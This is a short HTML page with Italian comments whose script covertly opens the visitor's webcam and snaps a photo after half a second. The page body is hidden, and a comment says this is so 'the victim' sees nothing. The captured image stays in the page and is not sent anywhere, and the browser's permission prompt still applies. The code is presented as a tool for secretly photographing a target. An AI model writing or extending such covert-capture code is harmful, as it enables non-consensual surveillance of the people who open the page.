<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Scatta la foto automaticamente</title>
</head>
<body style="display:none;"> <!-- Nasconde la pagina per non far vedere nulla alla vittima -->
    <video id="video" width="320" height="240" autoplay></video>
    <img id="foto" src="" alt="Immagine scattata" style="display:none;" /> <!-- L'immagine scattata sarà mostrata qui -->

    <script>
        const video = document.getElementById('video');
        const foto = document.getElementById('foto');

        // Richiesta dell'autorizzazione per accedere alla fotocamera
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;
                
                // Scatta la foto automaticamente dopo 0.5 secondi
                setTimeout(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;

                    const context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);

                    // La foto viene scattata automaticamente e salvata nel tag img
                    foto.src = canvas.toDataURL('image/png');
                    
                    // Rendi visibile l'immagine
                    foto.style.display = "block";
                }, 500); // 0.5 secondi per scattare la foto
            })
            .catch(error => {
                console.error("Errore nell'accesso alla fotocamera: ", error);
                alert("Non è stato possibile accedere alla fotocamera. Assicurati di consentire l'accesso.");
            });
    </script>
</body>
</html>
